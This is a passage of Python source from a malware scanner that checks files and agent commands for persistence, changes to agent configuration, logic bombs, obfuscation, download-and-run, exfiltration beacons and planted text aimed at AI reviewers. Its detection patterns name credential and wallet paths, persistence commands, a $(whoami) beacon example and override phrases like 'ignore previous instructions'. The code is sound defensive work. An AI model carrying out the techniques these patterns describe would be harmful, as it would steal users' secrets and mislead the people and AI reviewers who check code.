    r"|(?:Add-Content|Set-Content|Out-File)[^\n]{0,200}(?:\$PROFILE|PowerShell_profile\.ps1)"
    r"|[\\/]LaunchAgents[\\/]|[\\/]LaunchDaemons[\\/]|\blaunchctl\s+(?:load|bootstrap|submit)\b"
    r"|\bschtasks(?:\.exe)?\s+/create\b|\bRegister-ScheduledTask\b|\bNew-ScheduledTaskAction\b"
    r"|\\CurrentVersion\\Run(?:Once)?\b|\breg(?:\.exe)?\s+add\s+[^\n]{0,160}\\Run\b"
    r"|Start Menu\\Programs\\Startup|\bshell:startup\b|\bcrontab\s+-(?!l\b)|\(crontab\s+-l|/etc/cron\.|/var/spool/cron"
    r"|\bsystemctl\s+--user\s+enable\b|\.config[\\/]systemd[\\/]user[\\/]|\.config[\\/]autostart[\\/]", re.I)
PERSIST_SEV = S("critical", "low", "low", "high")

AGENT_CONFIG = re.compile(
    r"\.claude[\\/](?:settings(?:\.local)?\.json|hooks|commands[\\/]|agents[\\/]|skills[\\/])|\.claude\.json\b"
    r"|\bCLAUDE(?:\.local)?\.md\b|\bAGENTS(?:\.override)?\.md\b|\bGEMINI\.md\b|\.cursor[\\/](?:rules|mcp\.json|hooks\.json)"
    r"|\.cursorrules\b|\.codex[\\/](?:config\.toml|AGENTS\.md)|\.gemini[\\/]settings\.json|\.mcp\.json\b|openclaw\.json\b|\bSOUL\.md\b"
    r"|\.vscode[\\/](?:settings|tasks|mcp)\.json|claude_desktop_config\.json|\.windsurfrules\b|\.clinerules\b"
    r"|copilot-instructions\.md|\.git[\\/]hooks\b|core\.hooksPath", re.I)
GLOBAL_HINT = re.compile(r"~[\\/]|\$HOME\b|\$\{HOME\}|%USERPROFILE%|%APPDATA%|homedir\(\)|expanduser\(|Path\.home\(\)"
                         r"|\bUSERPROFILE\b|\bAPPDATA\b|XDG_CONFIG_HOME|getenv\(\s*['\"]HOME", re.I)
INSTRUCTION_FILE = re.compile(r"(?:CLAUDE(?:\.local)?|AGENTS(?:\.override)?|GEMINI|SOUL)\.md$|\.cursorrules$|\.windsurfrules$"
                              r"|\.clinerules$|copilot-instructions\.md$", re.I)
AGENT_CFG_SEV = S("critical", "medium", None, "high")

AI_ADDRESSED = re.compile(
    r"(?:ignore|disregard|forget)\s+(?:all\s+|any\s+)?(?:of\s+)?(?:the\s+|your\s+)?(?:previous|prior|above|earlier|preceding|system)\s+"
    r"(?:instructions|prompts?|rules|guidelines|directives|context)"
    r"|override\s+(?:all\s+|any\s+)?(?:the\s+|your\s+)?(?:previous|prior|system)\s+(?:instructions|prompts?|directives)"
    # "Note to AI scanners:" is a heading aimed at a reviewer; "an error message for the LLM" is ordinary AI-app code.
    r"|(?:note|message|attention|instructions?)\s+(?:to|for)\s+(?:the\s+|any\s+|all\s+)?(?:ai|llms?|language\s+models?|ai\s+assistants?|"
    r"coding\s+agents?|(?:ai\s+)?automated\s+(?:scanners?|reviewers?|tools?|analysis)|(?:ai\s+)?security\s+(?:scanners?|tools?|reviewers?|"
    r"auditors?)|(?:ai\s+)?(?:code\s+)?reviewers?(?:\s+bots?)?|(?:ai\s+)?scanners?)\s*[:\-\u2014,!]"
    r"|\b(?:ai|llm|gpt|claude|copilot|automated|security|malware)\s+(?:assistants?|agents?|scanners?|reviewers?|auditors?|tools?|models?|analy[sz]ers?)\b"
    r"[^\n]{0,80}\b(?:should|must|need\s+to|are\s+instructed\s+to|do\s+not|don'?t|never)\b[^\n]{0,60}\b(?:flag|report|mark|classify|treat|"
    r"ignore|approve|consider|skip|analy[sz]e|label)"
    # "This function is safe to call" is ordinary documentation (every Rust `unsafe` justification says it); a claim
    # counts when it is a verdict meant for a scanner: benign/whitelisted/approved, or safe/trusted plus scanner words.
    r"|\b(?:this|the\s+following|the\s+code\s+below|this\s+entire)\s+(?:code|package|module|file|script|function|payload|library)\s+"
    r"(?:is|has\s+been)\s+(?:completely\s+|fully\s+|already\s+|100%\s+)?(?:benign|harmless|not\s+malicious|whitelisted|allowlisted|"
    r"security[- ]reviewed|(?:reviewed|audited|verified)\s+and\s+approved|pre-?approved)\b"
    r"|\b(?:this|the\s+following|the\s+code\s+below|this\s+entire)\s+(?:code|package|module|file|script|payload|library)\s+"
    r"(?:is|has\s+been)\s+(?:completely\s+|fully\s+|already\s+|100%\s+)?(?:safe|trusted|verified|audited)\b(?!\s+to\b)[^\n.]{0,80}"
    r"\b(?:scan(?:ner|ning)?s?|review(?:er|ed)?s?|flag(?:ged)?|report(?:ed)?|analy[sz]\w*|audit\w*|malware|AI|LLMs?|models?)\b",
    re.I)
AI_SEV = S("high", "medium", "low", "medium")

CONDITIONAL = re.compile(
    r"Date\.now\(\)\s*[<>]=?\s*\d{11,}|new\s+Date\(\s*['\"]20\d\d-\d\d|getFullYear\(\)\s*[<>]=?\s*20\d\d"
    r"|datetime\.(?:now|today|utcnow)\(\)\s*[<>]=?|date\.today\(\)\s*[<>]=?|time\.time\(\)\s*[<>]=?\s*\d{9,}"
    r"|process\.env\.(?:CI|GITHUB_ACTIONS|GITLAB_CI|JENKINS_URL|BUILDKITE|CIRCLECI|TRAVIS)\b"
    r"|os\.environ(?:\.get)?\s*[\[(]\s*['\"](?:CI|GITHUB_ACTIONS|GITLAB_CI|JENKINS_URL)['\"]"
    r"|(?:os\.)?platform\(\)\s*===?\s*['\"](?:darwin|win32|linux)['\"]|sys\.platform\s*==\s*['\"](?:darwin|win32)['\"]", re.I)

_NOW_YEAR = time.gmtime().tm_year
_FUTURE = (r"(?:Date\.parse\(\s*['\"](?P<y1>20\d\d)[^)]{0,40}\)|new\s+Date\(\s*['\"]?(?P<y2>20\d\d)[^)]{0,40}\)|(?P<ms1>\d{13})\b)")
# A logic bomb compares the current time with a fixed moment that has not come yet; comparing with a header value,
# a cache expiry or a past test date is ordinary code.
FUTURE_DATE_GATE = re.compile(
    r"(?:Date\.now\(\)|new\s+Date\(\)(?:\.getTime\(\))?)\s*[<>]=?\s*" + _FUTURE
    + r"|" + _FUTURE.replace("y1", "y3").replace("y2", "y4").replace("ms1", "ms2")
    + r"\s*[<>]=?\s*(?:Date\.now\(\)|new\s+Date\(\))"
    r"|datetime(?:\.datetime)?\.(?:now|today|utcnow)\([^)]{0,20}\)\s*[<>]=?\s*datetime(?:\.datetime)?\(\s*(?P<y5>20\d\d)"
    r"|date\.today\(\)\s*[<>]=?\s*date\(\s*(?P<y6>20\d\d)|time\.time\(\)\s*[<>]=?\s*(?P<s1>\d{10})\b", re.I)


def _future_gate(m: re.Match) -> bool:
    years = [int(m.group(k)) for k in ("y1", "y2", "y3", "y4", "y5", "y6") if m.group(k)]
    if years:
        return years[0] >= _NOW_YEAR
    stamp = next((int(m.group(k)) / 1000 for k in ("ms1", "ms2") if m.group(k)), None)
    if stamp is None and m.group("s1"):
        stamp = int(m.group("s1"))
    return stamp is not None and stamp >= time.time() - 30 * 86400


OBF_IDENT = re.compile(r"\b_0x[0-9a-f]{1,6}\b")
OBF_SIGNATURE = re.compile(r"\.push\(\s*[\w$]+\.shift\(\)\s*\)|\[['\"]push['\"]\]\(\s*[\w$]+\[['\"]shift['\"]\]\(\)\s*\)"
                           r"|\[\s*(?:Buffer\.from|atob)\s*\(|\[\s*_0x[0-9a-f]{1,6}\s*\(\s*['\"]0x[0-9a-f]+['\"]")
PACKER = re.compile(r"\beval\s*\(\s*function\s*\(\s*p\s*,\s*a\s*,\s*c\s*,\s*k\s*,\s*e\s*,\s*[dr]\s*\)|__pyarmor__|pyarmor_runtime")
JSFUCK = re.compile(r"[\[\]()!+]{300,}")
HIDDEN_HTML = re.compile(r"<!--(.{0,4000}?)-->", re.S)

# ------------------------------------------------------------------------------------------------ hosts


# --------------------------------------------------------------------------------------------- scanning


# Download-and-run severity by where the script comes from. "none" means no URL is visible (a variable).
DECODED_DOWNLOADS = ("pipes a decoded download into a shell or interpreter", "decodes a download into a file and runs it")
DOWNLOAD_SEVERITY = {
    "autoexec": {"none": "high", "official": "medium", "unknown": "high", "plain-http": "high", "risky": "critical"},
    "code": {"none": "medium", "official": "low", "unknown": "medium", "plain-http": "low", "risky": "high"},
    "config": {"none": "medium", "official": "low", "unknown": "medium", "plain-http": "low", "risky": "high"},
    # documentation and comments: prose that names the pattern without a URL is not an instruction to run anything
    "doc": {"none": None, "official": None, "unknown": "low", "plain-http": "medium", "risky": "high"},
}
HOST_NOTE = {"official": " (official installer)", "unknown": " from a host that is not an official installer",
             "plain-http": " over plain HTTP", "risky": " from a look-alike domain, raw IP or capture service", "none": ""}


_LOCAL_ONLY = re.compile(r"^(?!.*https?://(?!(?:127\.0\.0\.1|localhost|\[::1\])\b)).*(?:127\.0\.0\.1|localhost|::1)\b")
SECRET_HUNT = re.compile(r"\b(?:api[_ -]?keys?|tokens?|secrets?|credentials?|passwords?|wallets?|seed\s+phrases?|"
                         r"private\s+keys?|mnemonics?|\.env\b|\.ssh\b|\.aws\b|id_rsa|keychain)", re.I)

# An interpreter given its program on the command line reads the piped download as data: perl -wlne '...',
# python -c "...", node -e '...', ruby -e, php -r. (`python -`, `perl -` and `sh -s` read the program from the pipe.)
INLINE_PROGRAM = re.compile(r"[ \t]+(?:-[\w-]+[ \t]+)*?(?:-[a-zA-Z]*[eEp][a-zA-Z]*|-c|-r|--eval|--print|-Command)[ \t]+['\"]")


def _doc_download_severity(match_text: str) -> tuple[str | None, str]:
    kind = host_kind(match_text)
    return DOWNLOAD_SEVERITY["doc"][kind], HOST_NOTE[kind]


_TEMPLATE_HOST = re.compile(r"[a-z][a-z0-9+.-]*://(?:\$\{|\{\{|\{[\w.]+\}|<|%\()", re.I)


def _test_data(col: Collector, pos: int) -> bool:
    """Kept for the structural checks: a match inside a string literal in a test file."""
    return data_string(col.text, pos, col.path, "code") and is_test_code(col.path)


_INDEX_FLAG_BEFORE_URL = re.compile(
    r"(?:--index-url|--extra-index-url|--default-index|--index|--find-links|--trusted-host|--registry|-[if])[ =]+[\"']?$")


def _url_is_index_value(match_text: str) -> bool:
    """True when every URL in an install command is the value of an index/registry flag, not a package to install."""
    for m in re.finditer(r"(?:https?://|git\+)\S+", match_text):
        if not _INDEX_FLAG_BEFORE_URL.search(match_text[:m.start()]):
            return False
    return True


def _sev_context(context: str) -> str:
    """Commands an agent is about to run are judged like code that runs on its own."""
    return "autoexec" if context == "agent" else context


_CODE_HOSTS = ("github.com", "gitlab.com", "bitbucket.org", "codeberg.org", "git.sr.ht")


def _agent_loaded(path: str) -> bool:
    """Skills, AGENTS.md, CLAUDE.md and rules files: instructions an agent follows, unlike a README a person reads."""
    from .surfaces import AUTO_LOADED

    return bool(AUTO_LOADED.search(path)) or path.lower().endswith("skill.md")


def _code_host_install(snippet: str) -> bool:
    """Every URL or shorthand the install line uses is a public code host, over HTTPS or the SSH and git transports
    (`git+ssh://git@github.com/...`): the project's own source repository, as a README points at it."""
    urls_ = re.findall(r"(?:git\+)?(https?|ssh|git)://(?:[\w.-]+@)?([^/\s'\"#@:]+)", snippet)
    scp = re.findall(r"\bgit@([\w.-]+):", snippet)
    short = re.findall(r"\b(github|gitlab|bitbucket):", snippet)
    return bool(urls_ or scp or short) and all(scheme in ("https", "ssh", "git") and host.lower() in _CODE_HOSTS
                                               for scheme, host in urls_) and all(h.lower() in _CODE_HOSTS for h in scp)


_FETCH_NEAR = re.compile(r"\b(?:https?|ftp)://|\b(?:curl|wget|iwr|Invoke-WebRequest|DownloadFile|DownloadString|"
                         r"urlretrieve|urlopen)\b|\b(?:fetch|requests\.get|axios\.get|https?\.get)\s*\(", re.I)


def _acts_on(text: str, start: int, end: int) -> bool:
    """Something on the same line as a match downloads or starts a program."""
    around = text[max(text.rfind("\n", 0, start) + 1, start - 300):start] + line_window(text, start, end, 300)
    return bool(_FETCH_NEAR.search(around) or EXEC_ON_LINE.search(around))


def _apply(patterns, col: Collector, text: str, context: str, low: str | None = None) -> None:
    ctx = _sev_context(context)
    low = text.lower() if low is None else low
    code_file = ctx in ("code", "autoexec", "config") and not col.command
    for pat in patterns:
        sev = pat.sev.get(ctx)
        if sev is None or not has(low, pat.need):
            continue
        for m in pat.regex.finditer(text):
            message, severity = pat.message, sev
            if pat.rule == R_URL_INSTALL and _url_is_index_value(m.group(0)):
                continue
            if pat.rule == R_URL_INSTALL and re.search(r"[@#][0-9a-f]{40}\b", m.group(0)):
                severity, message = bump(severity, -1), message + " (pinned to a commit)"
            elif pat.rule == R_URL_INSTALL and ctx == "doc" and _code_host_install(m.group(0)) \
                    and not _agent_loaded(col.path):
                # A README that says how to install the project from its source repository is documenting, not
                # luring; other hosts, plain HTTP and bare addresses keep their severity.
                severity, message = "low", message + " (from a code host, in documentation)"
            if pat.rule == R_DECODE_EXEC and pat.message == "loads marshalled bytecode" and ctx == "code" \
                    and not re.search(r"\b(?:exec|eval)\s*\(", line_window(text, m.start(), m.end(), 200)):
                severity = "low"  # serializers load marshal data; running it is what the exec-of-marshal pattern catches
            if pat.rule == R_ATTACK_TOOL and ctx == "code" and not _acts_on(text, m.start(), m.end()):
                # Detection rules, blocklists and scanners name these tools too; code that fetches or runs one has a
                # URL, a download or a call that starts a program on the same line.
                severity, message = "low", message + " (named, not fetched or run)"
            commented = code_file and in_comment(text, m.start(), col.path)
            if pat.message == "pipes a download into an interpreter" and INLINE_PROGRAM.match(text, m.end()):
                continue  # `curl page | perl -ne '...'`: the download is input to a program written on the line
            if pat.rule == R_DOWNLOAD_EXEC:  # the risk depends on where the script comes from
                kind = host_kind(line_window(text, m.start(), m.end()))
                severity = DOWNLOAD_SEVERITY["doc" if (sev == "doc" or commented) else ctx][kind]
                if pat.message == "downloads a program and makes it executable":
                    if context != "agent":
                        continue  # files have their own staged-download check (DOWNLOAD_THEN_RUN in scan_text)
                    # Installing a CLI from its release page is ordinary and worth a confirmation; a program
                    # fetched over plain HTTP, from a bare IP or a look-alike host is not ordinary.
                    severity = "high" if kind in ("plain-http", "raw-ip", "lookalike") else sev
                if pat.message in DECODED_DOWNLOADS and kind != "none" and not commented:
                    severity = max(severity or "low", sev, key=rank)  # decoding first is never an installer's habit
                message += HOST_NOTE[kind] + (" (in a comment)" if commented else "")
            elif pat.rule == R_EXFIL and pat.message == "sends data to a remote host":
                if host_kind(line_window(text, m.start(), m.end())) == "official":
                    severity = "low"
            elif pat.rule == R_INLINE_NET and (host_kind(line_window(text, m.start(), m.end())) == "official"
                                               or _LOCAL_ONLY.search(line_window(text, m.start(), m.end()))):
                # `powershell -c "irm https://astral.sh/... | iex"`: the vendor's own one-liner, judged like a download
                severity = None if ctx == "doc" else "low" if ctx != "autoexec" else "medium"
            elif pat.rule == R_AGENT_BYPASS and ctx == "code" and SECRET_HUNT.search(line_window(text, m.start(), m.end(), 400)):
                severity, message = "high", message + " and sends it after secrets"
            elif commented and rank(severity) > rank("low"):
                severity, message = "low", message + " (in a comment)"
            if severity and code_file and rank(severity) > rank("low") and data_string(text, m.start(), col.path, ctx):
                severity, message = "low", message + " (in a string that is data: a pattern, a sentence or test input)"
            col.add(pat.rule, severity, m.start(), message, context)


def analyze_command(command: str, path: str, line: int = 0, context: str = "autoexec", note: str = "",
                    _depth: int = 0) -> list[Finding]:
    """Rules for a single command line (hook, script, task, agent Bash call), and for what it really runs once the
    shell's own disguises are undone (pah.shellfold)."""
    ctx = _sev_context(context)
    low = command.lower()
    col = Collector(path, command, line_offset=max(0, line - 1), note=note, command=True)
    _apply(COMMAND_PATTERNS, col, command, context, low)
    for m in SECRET_PATHS.finditer(command) if has(low, SECRET_NEED) else ():
        col.add(R_SECRETS, S("high", "medium", "low", "high").get(ctx) or "high", m.start(), "references " + m.group(),
                context)
    _registry(col, command, context, low)
    _exfil_hosts(col, command, context, low)
    m = AGENT_CONFIG.search(command) if has(low, AGENT_NEED) else None
    if m and WRITE_OP.search(command):
        sev = AGENT_CFG_SEV.get(ctx) or "medium"
        note = ""
        if ctx == "doc" and re.match(r"(?i)\.git[\\/]hooks|core\.hooksPath", m.group()):
            sev = "low"  # contributor guides install git hooks; agent settings are what instruction files must not touch
        elif m.group().lower() == "core.hookspath" and _IN_PROJECT_HOOKS.match(command, m.end()):
            # what hook managers (husky, simple-git-hooks) do: the hooks are the project's own files, read as code
            sev, note = "low", " to a folder inside the project"
        col.add(R_AGENT_CFG_WRITE, sev, m.start(), "changes agent configuration " + m.group() + note, context)
    m = PERSIST.search(command) if has(low, PERSIST_NEED) else None
    if m:
        col.add(R_PERSIST, PERSIST_SEV.get(ctx) or "medium", m.start(), "sets up persistence", context)
    if has(low, ENV_NEED) and ENV_DUMP.search(command) and NETWORK.search(command):
        col.add(R_EXFIL, "critical" if ctx == "autoexec" else "high", 0, "collects the environment and sends it",
                context)
    if ctx == "autoexec":
        _shell_beacon(col, command, context)
    for blob in decode_blobs(command):
        col.items.extend(analyze_command(blob["text"], path, line, context, note=f"decoded {blob['kind']}: ",
                                         _depth=_depth + 1))
    if _depth < 4:
        _unfolded(col, command, path, line, context, note, _depth)
    return col.items


def _unfolded(col: Collector, command: str, path: str, line: int, context: str, note: str, depth: int) -> None:
    """Judge what the command stands for once quote breaks, $IFS, variables, runners and decoders are undone. For an
    agent's command, a decode-and-run pipeline whose payload decodes completely to nothing risky is reported, not
    blocked: the guard has read what the shell would run, which is the point of decoding it."""
    from .shellfold import unfold

    variants, undecoded = unfold(command)
    payload_findings: list[Finding] = []
    decoded = False
    for text, how, is_payload in variants:
        found = analyze_command(text, path, line, context, note=f"{note}{how}: ", _depth=depth + 1)
        col.items.extend(found)
        if is_payload:
            decoded = True
            payload_findings.extend(found)
    if context != "agent" or not decoded or undecoded:
        return
    if any(rank(f.severity) >= rank("medium") for f in payload_findings):
        return
    for f in col.items:
        if f.rule == R_DECODE_EXEC and "pipes decoded data into a shell" in f.message and rank(f.severity) >= rank("medium"):
            f.severity = "low"
            f.message += " (it decodes completely to a command with nothing risky in it)"


REGISTRY_FLAG = re.compile(
    r"(?:--registry|--index-url|--extra-index-url|--default-index|--index|-i)[ =]+[\"']?(\S+?)[\"']?(?=\s|$)"
    r"|\b(?:npm|pnpm|yarn)\s+config\s+set\s+(?:@[\w-]+:)?registry[ =]+[\"']?(\S+?)[\"']?(?=\s|$)"
    r"|\bpip[0-9.]*\s+config\s+set\s+global\.(?:extra-)?index-url[ =]+[\"']?(\S+?)[\"']?(?=\s|$)", re.I)
_PKG_CMD = re.compile(r"\b(?:npm|pnpm|yarn|bun|npx|pip[0-9.]*|uv|uvx|pipx|poetry|cargo|gem)\b", re.I)


def _registry(col: Collector, text: str, context: str, low: str | None = None) -> None:
    context_sev = _sev_context(context)
    if not has(text.lower() if low is None else low, ("registry", "index", "-i ", "-i=", "config set")):
        return
    for m in REGISTRY_FLAG.finditer(text):
        before = text[max(0, m.start() - 200):m.start()]
        if not _PKG_CMD.search(before) and "config" not in m.group(0):
            continue
        target = next(g for g in m.groups() if g)
        if not re.match(r"https?://", target):
            continue
        kind = classify_host(target)
        if kind == "official":
            continue
        sev = {"autoexec": "high", "doc": "high" if kind in ("lookalike", "raw-ip", "plain-http") else "medium",
               "code": "medium", "config": "high"}.get(context_sev, "high")
        if context_sev in ("code", "autoexec") and not col.command and data_string(text, m.start(), col.path, context_sev):
            sev = "low"
        host = (host_of(target) or "").lower()
        note = ""
        if _DOC_HOST.fullmatch(host):
            sev, note = "low", " (a documentation domain)"  # example.com serves no packages
        elif context_sev == "doc" and _PUBLIC_MIRRORS.search(host) and not _agent_loaded(col.path):
            sev, note = "low", " (a public mirror of PyPI, in documentation)"
        col.add(R_REGISTRY, sev, m.start(), f"package source set to {host or target}{note}", context)


# Public mirrors of the Python Package Index that READMEs name for readers in regions where pypi.org is slow, and
# Anaconda's index of nightly scientific wheels.
_PUBLIC_MIRRORS = re.compile(r"(?:^|\.)(?:mirror\.baidu\.com|mirrors\.aliyun\.com|pypi\.tuna\.tsinghua\.edu\.cn|"
                             r"mirrors\.tuna\.tsinghua\.edu\.cn|pypi\.mirrors\.ustc\.edu\.cn|mirrors\.cloud\.tencent\.com|"
                             r"repo\.huaweicloud\.com|pypi\.douban\.com|pypi\.anaconda\.org)$")


def _exfil_hosts(col: Collector, text: str, context: str, low: str | None = None) -> None:
    # In code that runs on its own, a capture service or raw IP is a beacon. Elsewhere it is often the point of the
    # code (a transfer.sh client); a stealer in ordinary code is caught by secrets + network + destination together.
    sev = S("high", "low", "low", "high").get(_sev_context(context)) or "medium"
    low = text.lower() if low is None else low
    ctx = _sev_context(context)

    def level(pos: int) -> str:
        if ctx in ("code", "autoexec") and not col.command and data_string(text, pos, col.path, ctx):
            return "low"
        return sev

    for m in EXFIL_HOSTS.finditer(text) if has(low, EXFIL_NEED) else ():
        col.add(R_EXFIL_HOST, level(m.start()), m.start(), "contacts " + m.group(0), context)
    for m in RAW_IP_URL.finditer(text) if "://" in text else ():
        if not is_private_ip(m.group(1)):
            col.add(R_EXFIL_HOST, level(m.start()), m.start(), "contacts a raw IP address " + m.group(1), context)


DYNAMIC_EXEC = re.compile(r"(?<![.\w$])(?:exec|eval)\s*\(\s*(?!['\"`)])|\bnew\s+Function\s*\(|\bvm\.run\w*\s*\("
                          r"|\b(?:Invoke-Expression|iex)\b\s*[\($]")
_NET_FALLBACK = re.compile(r"\b(?:https|http|net|dns)\.\w+\(|require\(['\"](?:node:)?https?['\"]\)")
_SECRET_KINDS = (("ssh", (".ssh", "id_rsa", "id_ed25519", "id_ecdsa")), ("aws", (".aws",)),
                 ("gcloud", ("gcloud", "application_default")), ("azure", (".azure",)), ("kube", (".kube",)),
                 ("docker", (".docker",)), ("git", (".git-credentials", "hosts.yml")), ("netrc", (".netrc",)),
                 ("pypi", (".pypirc",)), ("ai-tools", (".claude", ".codex", ".gemini", "openclaw", ".cline", ".continue",
                                                        "state.vscdb", ".copilot", "github-copilot")),
                 ("browser", ("login data", "cookies", "local state", "web data", "key3.db", "key4.db", "logins.json")),
                 ("wallet", ("wallet.dat", "exodus", "electrum", "nkbihfbeogaeaoehlefnkodbefgpgknn",
                             "bfnaelmomeimhlpmgjnjophhpkkoljpa")), ("keychain", ("keychain",)),
                 ("messaging", ("leveldb", "tdata")))


_OPEN_QUOTES = "\"'`\u201c\u2018\u00ab"
_CLOSE_QUOTES = "\"'`\u201d\u2019\u00bb"


def _quoted_mention(text: str, start: int, end: int) -> bool:
    """The phrase is quoted as an example (`like "Ignore all previous instructions"`), not addressed to anyone."""
    before = text[max(0, start - 3):start].rstrip()
    after = text[end:end + 60]
    return bool(before) and before[-1] in _OPEN_QUOTES and any(q in after for q in _CLOSE_QUOTES)


def _secret_kinds(matches) -> set[str]:
    kinds = set()
    for m in matches:
        low = m.group().lower()
        kinds.update(name for name, words in _SECRET_KINDS if any(w in low for w in words))
    return kinds


# (?![-.\w]): not a dotted name that goes on, like the grammar scope keyword.other.constructor.constructor-type
FUNCTION_ALIAS = re.compile(r"\.constructor\s*\.\s*constructor\b(?![-.\w])(?!\s*\(\s*['\"]return this)"
                            r"|\.constructor\s*\[\s*['\"]constructor['\"]\s*\]|\bFunction\.prototype\.constructor\b"
                            r"|\bReflect\.construct\s*\(\s*Function\b")


# Host details that identify a machine or its owner. Not the home folder: installers use it to find their cache.
FINGERPRINT = re.compile(r"\bsocket\.(?:gethostname|getfqdn)\s*\(|\bgetpass\.getuser\s*\(|\bos\.getlogin\s*\(|"
                         r"\bplatform\.node\s*\(|\buuid\.getnode\s*\(|\bos\.(?:hostname|userInfo|networkInterfaces)\s*\(|"
                         r"\bdns\.getServers\s*\(")
_DNS_SEND = re.compile(r"\bgethostbyname(?:_ex)?\s*\(|\bgetaddrinfo\s*\(|\bdns\.(?:lookup|resolve\w*)\s*\(|\bresolver\.resolve\s*\(")
_PY_FETCH = re.compile(r"\brequests\.(?:get|post)\s*\(|\burlopen\s*\(|\burlretrieve\s*\(|\bhttpx\.(?:get|stream)\s*\(|"
                       r"\bwget\.download\s*\(")
_PY_WRITE = re.compile(r"open\([^)\n]{0,200}['\"]wb['\"]|\.write_bytes\s*\(|copyfileobj\s*\(|\burlretrieve\s*\(")
_PY_RUN = re.compile(r"\bos\.(?:system|startfile|popen|exec[lv]p?e?)\s*\(|\bsubprocess\.(?:run|call|Popen|check_call|check_output)\s*\(")
_STAGED = re.compile(r"(?m)^[ \t]*(?:(?:const|let|var)\s+)?([A-Za-z_$][\w$]*)\s*=\s*[^\n;]{0,300}?(?:b64decode|b32decode|"
                     r"b85decode|decodebytes|decompress|unhexlify|fromhex|\.decrypt\s*\(|Buffer\.from\([^\n;]{0,300}?"
                     r"['\"](?:base64|hex)['\"]\s*\)|\batob\s*\()")
_NPM_PUBLISH = re.compile(r"\b(?:exec|execSync|spawn|spawnSync|execFile|execFileSync|execa)\s*\([^)]{0,200}?"
                          r"\b(?:npm|pnpm|yarn)\b['\"]?\s*,?\s*\[?\s*['\"]?\s*publish\b")
_PKG_WRITE = re.compile(r"writeFile(?:Sync)?\s*\(\s*[^,\n]{0,120}package\.json")


# The user or machine name taken in a shell: a command substitution, or the variables shells and Windows set. Not
# `uname -a`: installers (nvm, the Maven wrapper) read it to tell the operating system, and only -n is the name alone.
SHELL_IDENTITY = re.compile(r"\$\(\s*(?:whoami|hostname|id\s+-u\s*-n|id\s+-un|uname\s+-n)\s*\)|`\s*(?:whoami|hostname|"
                            r"id\s+-un|uname\s+-n)\s*`|\$\{?(?:USER|USERNAME|LOGNAME|HOSTNAME)\}?(?!\w)|"
                            r"%(?:USERNAME|COMPUTERNAME|USERDOMAIN)%|\$env:(?:USERNAME|COMPUTERNAME)\b")
# A network command whose arguments carry a variable or a substitution: the address or the data is built at run time.
SHELL_SEND = re.compile(r"(?<![\w-])(?:curl|wget|nslookup|dig|ping|host|nc|ncat)\s[^\n;|&]{0,300}?(?:\$\{?\w|\$\(|`|"
                        r"%\w+%)|\b(?:Invoke-WebRequest|Invoke-RestMethod|iwr|irm)\s[^\n;|&]{0,300}?\$\w")
_SHELL_SPAWN = re.compile(r"\bsubprocess\.\w+\s*\(|\bpty\.spawn\s*\(|\bos\.(?:exec\w*|system|popen)\s*\(|"
                          r"['\"](?:/bin/(?:ba|z|da)?sh|cmd(?:\.exe)?|powershell(?:\.exe)?)['\"]")
_PY_CONNECT = re.compile(r"\.connect\s*\(\s*\(")
_PY_DUP2 = re.compile(r"\bdup2\s*\(\s*[\w.]+\.fileno\s*\(\s*\)")
_JS_SOCKET = re.compile(r"\bnet\.(?:Socket|connect|createConnection)\b|\bnew\s+(?:net\.)?Socket\s*\(")
_JS_SHELL = re.compile(r"\b(?:spawn|exec)\w*\s*\(\s*['\"](?:/bin/(?:ba|z)?sh|sh|bash|cmd(?:\.exe)?|"
                       r"powershell(?:\.exe)?)['\"]")


_INSTALL_HOOK = re.compile(r"\bcmdclass\s*=|\bclass\s+\w+\s*\(\s*(?:[\w.]+\.)?(?:install|develop|egg_info|build_py|sdist|"
                           r"bdist_wheel)\s*\)")


# A string literal written to a file, then the file handed to a call: a dropper's second stage, held as a string.
_WRITE_LITERAL = re.compile(r"\b(?P<obj>[A-Za-z_]\w*)\.write(?:_text|_bytes)?\s*\(\s*[rbuRBU]{0,2}(?P<q>\"\"\"|'''|\"|')"
                            r"(?P<body>.{20,}?)(?P=q)\s*[,)]", re.S)
_CODE_HINT = re.compile(r"\bimport\s+\w|\bexec\s*\(|\beval\s*\(|\burlopen\b|\brequests\.|\bsubprocess\b|\bos\.system\b")


def _passes_written_file(text: str, obj: str, start: int) -> bool:
    """After the write, a call receives the file: `run([sys.executable, f.name])`, `system(f"start {x} {t.name}")`,
    or the path the file was opened from."""
    names = [re.escape(obj) + r"\.name\b"]
    opened = re.search(rf"(?:\b{re.escape(obj)}\s*=\s*open\s*\(\s*([\w.]+)|\bopen\s*\(\s*([\w.]+)[^)\n]*\)\s+as\s+"
                       rf"{re.escape(obj)}\b)", text[:start])
    if opened:
        names.append(r"\b" + re.escape(opened.group(1) or opened.group(2)) + r"\b")
    return bool(re.search(rf"[\w.]+\s*\([^\n]{{0,200}}?(?:{'|'.join(names)})", text[start:start + 3000]))


def _dropped_code(col: Collector, text: str, path: str, context: str) -> None:
    """Python that writes code held in a string to a file and then hands that file to a call (the interpreter, a
    shell, os.startfile): the string is judged as code in the same context, so what it does decides the verdict. A
    helper script that a build tool writes and runs does nothing risky and stays clean."""
    for m in _WRITE_LITERAL.finditer(text):
        body = m.group("body")
        if _CODE_HINT.search(body) and _passes_written_file(text, m.group("obj"), m.end()):
            line = col.offset + col.lines.line(m.start("body")) - 1
            for f in scan_text(body, path, context, structural=False, line_offset=line,
                               note=col.note + "code it writes to a file and runs: "):
                col.items.append(f)
            return


# core.hooksPath set to a relative folder that stays in the project (.githooks, .husky/_), not an outside path.
_IN_PROJECT_HOOKS = re.compile(r"\s+['\"]?(?![/~\\$%]|[A-Za-z]:|\.\.)[\w.-]+(?:/[\w.-]+)*['\"]?(?=\s|$|[;&|)])")


def _shell_beacon(col: Collector, text: str, context: str) -> None:
    """Install-time shell code that takes the user or machine name and runs a network command built from variables:
    `curl http://$(whoami).example.invalid`, or the name hex-encoded into a variable first and sent as a subdomain."""
    if not has(text.lower(), ("curl", "wget", "nslookup", "dig ", "ping", "host ", "nc ", "ncat", "invoke-", "iwr", "irm")):
        return
    # The name goes into the request a few statements later; in a long script an error message that prints
    # `whoami` and a download near the top have nothing to do with each other (nvm.sh).
    sends = [m for m in SHELL_SEND.finditer(text)][:200]
    for who in list(SHELL_IDENTITY.finditer(text))[:50]:
        send = next((m for m in sends if -300 <= m.start() - who.start() <= 1500), None)
        if send:
            col.add(R_EXFIL, "high", send.start(), f"takes the user or machine name ({who.group().strip()}) and runs a "
                    "network command built from variables while installing", context)
            return


def _reverse_shell(col: Collector, text: str, path: str, context: str, live) -> None:
